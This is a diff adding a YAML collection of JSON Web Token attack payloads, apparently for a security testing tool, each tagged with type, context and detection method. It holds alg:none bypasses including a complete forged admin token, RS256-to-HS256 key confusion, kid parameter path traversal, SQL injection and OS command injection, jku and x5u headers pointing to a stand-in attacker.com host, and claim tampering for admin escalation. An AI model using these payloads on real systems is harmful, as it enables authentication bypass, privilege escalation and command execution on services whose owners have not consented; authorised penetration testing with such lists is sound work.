@@ -1,0 +1,144 @@
+# JWT Attack Payloads with Metadata
+# Usage: Filter by type or context for targeted testing
+# Note: Many payloads are JSON header/claim structures to be base64url-encoded
+
+payloads:
+  # Algorithm None bypass
+  - payload: '{"alg":"none"}'
+    type: alg-none
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Set header alg to none, remove signature portion entirely"
+
+  - payload: '{"alg":"None"}'
+    type: alg-none
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Case variation bypass"
+
+  - payload: '{"alg":"NONE"}'
+    type: alg-none
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Uppercase case variation bypass"
+
+  - payload: '{"alg":"nOnE"}'
+    type: alg-none
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Mixed case variation bypass"
+
+  # Empty signature
+  - payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
+    type: alg-none
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Complete JWT with alg:none, sub:admin, empty signature"
+
+  # Algorithm confusion RS256 -> HS256
+  - payload: '{"alg":"HS256","typ":"JWT"}'
+    type: alg-confusion
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Change RS256 to HS256, sign with public key as HMAC secret"
+
+  - payload: '{"alg":"HS384","typ":"JWT"}'
+    type: alg-confusion
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Change RS384 to HS384, sign with public key as HMAC secret"
+
+  - payload: '{"alg":"HS512","typ":"JWT"}'
+    type: alg-confusion
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Change RS512 to HS512, sign with public key as HMAC secret"
+
+  # kid injection - directory traversal
+  - payload: '{"alg":"HS256","kid":"../../../../../../dev/null"}'
+    type: kid-injection
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Sign with empty string (content of /dev/null) as secret"
+
+  - payload: '{"alg":"HS256","kid":"../../../../../../etc/hostname"}'
+    type: kid-injection
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Sign with hostname file content as HMAC secret"
+
+  # kid injection - SQL injection
+  - payload: '{"alg":"HS256","kid":"key1'' UNION SELECT ''secret'' -- "}'
+    type: kid-injection
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "SQLi in kid to control signing key via UNION SELECT"
+
+  - payload: '{"alg":"HS256","kid":"key1'' OR ''1''=''1"}'
+    type: kid-injection
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+
+  # kid injection - command injection
+  - payload: '{"alg":"HS256","kid":"key1|/usr/bin/id"}'
+    type: kid-injection
+    context: [authorization-header, cookie, API-token]
+    detection: error-based
+    warning: "Command injection via kid parameter if passed to OS command"
+
+  # jku manipulation
+  - payload: '{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}'
+    type: jku-manipulation
+    context: [authorization-header, cookie, API-token]
+    detection: DNS-callback
+    warning: "Point jku to attacker-controlled JWKS endpoint"
+
+  - payload: '{"alg":"RS256","jku":"https://target.com@attacker.com/jwks.json"}'
+    type: jku-manipulation
+    context: [authorization-header, cookie, API-token]
+    bypass_type: url-parsing
+    detection: DNS-callback
+    warning: "URL parsing confusion with @ in jku"
+
+  - payload: '{"alg":"RS256","jku":"https://target.com/.well-known/jwks.json/../../../attacker.com/jwks.json"}'
+    type: jku-manipulation
+    context: [authorization-header, cookie, API-token]
+    bypass_type: path-traversal
+    detection: DNS-callback
+
+  # x5u manipulation
+  - payload: '{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}'
+    type: jku-manipulation
+    context: [authorization-header, cookie, API-token]
+    detection: DNS-callback
+    warning: "Point x5u to attacker-controlled certificate"
+
+  # Claim tampering - exp manipulation
+  - payload: '{"sub":"admin","exp":99999999999}'
+    type: claim-tampering
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Set expiration far in the future"
+
+  - payload: '{"sub":"admin","exp":0}'
+    type: claim-tampering
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Set expiration to epoch zero - some libraries skip validation"
+
+  # Claim tampering - role/sub escalation
+  - payload: '{"sub":"admin","role":"admin"}'
+    type: claim-tampering
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+
+  - payload: '{"sub":"admin","admin":true,"role":"superadmin"}'
+    type: claim-tampering
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+
+  - payload: '{"sub":"admin","iss":"trusted-issuer.com"}'
+    type: claim-tampering
+    context: [authorization-header, cookie, API-token]
+    detection: auth-observation
+    warning: "Forge issuer claim to match trusted issuer"
